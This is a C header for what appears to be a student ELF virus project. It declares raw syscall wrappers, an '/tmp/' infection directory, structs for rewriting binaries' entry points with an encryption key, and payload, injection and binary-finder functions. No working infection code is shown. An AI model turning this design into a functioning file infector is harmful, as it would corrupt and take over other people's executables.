#ifndef FT_VIRUS_H
# define FT_VIRUS_H

# include <elf.h>
# include "./struct.h"

# define SYS_READ 0
# define SYS_WRITE 1
# define SYS_OPEN 2
# define SYS_CLOSE 3
# define SYS_FSTAT 5
# define SYS_LSEEK 8
# define SYS_MMAP 9
# define SYS_MUNMAP 11
# define SYS_EXIT 60
# define SYS_GETUID 102
# define SYS_GETDENT64 217

# define O_RDONLY 0
# define O_WRONLY 1
# define O_RDWR 2
# define O_DIRECTORY 0x10000

# define DT_REG 8
# define MAP_SHARED 1
# define PROT_READ 1
# define PROT_WRITE 2
# define MAP_FAILED ((void *)-1)

# define PAYLOAD_ALIGN 0

/* lseek */
# define SEEK_SET 0
# define SEEK_CUR 1
# define SEEK_END 2

/*
# include <stdio.h>
# include <unistd.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
*/

# define INFESTED_DIR "/tmp/"
# define STRINGS_SECTION ".ft_data"

# define FORCE_INLINE __attribute__((always_inline)) inline
//# define STORE_VALUE __attribute__((section(STRINGS_SECTION)))

# define WRITE(fd, buffer, len) syscall3(SYS_WRITE, (u64)fd, (u64)buffer, (u64)len)
# define READ(fd, buffer, len) syscall3(SYS_READ, (u64)fd, (u64)buffer, (u64)len)
# define OPEN(pathname, flags) syscall2(SYS_OPEN, (u64)pathname, (u64)flags)
# define FSTAT(fildes, buf) syscall2(SYS_FSTAT, (u64)fildes, (u64)buf)
# define CLOSE(fd) syscall1(SYS_CLOSE, (u64)fd)
# define EXIT(code) syscall1(SYS_EXIT, (u64)code)
# define MMAP(addr, len, prot, flags, fildes, off) syscall6(SYS_MMAP, (void*)addr, (size_t)len, (int)prot, (int)flags, (int)fildes, (int)off)
# define MUNMAP(addr, length) syscall1(SYS_MUNMAP, (u64)addr, (u64)length)
# define LSEEK(fd, offset, whence) syscall3(SYS_LSEEK, (u64)fd, (u64)offset, (u64)whence)


typedef struct	s_static
{
	size_t pl_size;

}				t_static;

typedef struct s_binary
{
	size_t old_entry;
	size_t new_entry;
	size_t v_addr;
	size_t file_size;
}				t_binary;

typedef struct	s_data
{
	int fd;
	int virt_addr;
	int	key;
	int	decrypt_start;
	t_binary bin;
	t_static infos;
}		t_data;

/* syscalls.c */
u64	syscall1(int syscall, u64 arg1);
u64	syscall2(int syscall, u64 arg1, u64 arg2);
u64	syscall3(int syscall, u64 arg1, u64 arg2, u64 arg3);
u64 syscall6(int syscall, u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6);

/* biin_infos */
t_binary get_infos(int fd);

/* main.c */
void payload(void);
void payload_end(void);

/* inject.c */
int inject(t_data data);

/* binary_finder.c */
int finder(t_data data, int fd);

/* lib.c */
size_t	ft_strlen(char *str);
int	ft_memcmp(char *str1, char *str2, size_t len);
void	*ft_memcpy(char *dest, char *src, size_t len);
void	ft_putnbr(int n);
void	debug_u64(char *str, u64 nbr);
void	ft_putchar(char c);
void	ft_putul(u64 i);

/* get_rel_addr.s */
u64 get_rel_addr();

#endif
